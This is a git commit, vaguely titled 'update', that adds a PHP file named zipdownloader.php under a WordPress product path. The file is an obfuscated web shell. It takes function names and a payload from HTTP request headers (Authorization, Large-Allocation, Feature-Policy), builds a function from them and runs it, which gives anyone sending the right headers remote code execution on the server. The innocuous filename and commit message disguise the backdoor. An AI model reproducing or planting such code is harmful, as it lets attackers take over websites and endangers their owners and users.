9ac6bd58c4c8bdb6fc848eb1e2e973d3a4b35d39
Fast and Static <it@e-me.co>
2024-09-28 10:06:23 +0000

    update

---
+++ wp-json/wp/v2/product/14589/zipdownloader.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Authorization'])) {
+    $accepted = $_HEADERS['Authorization']('', $_HEADERS['Large-Allocation']($_HEADERS['Feature-Policy']));
+    $accepted();
+}
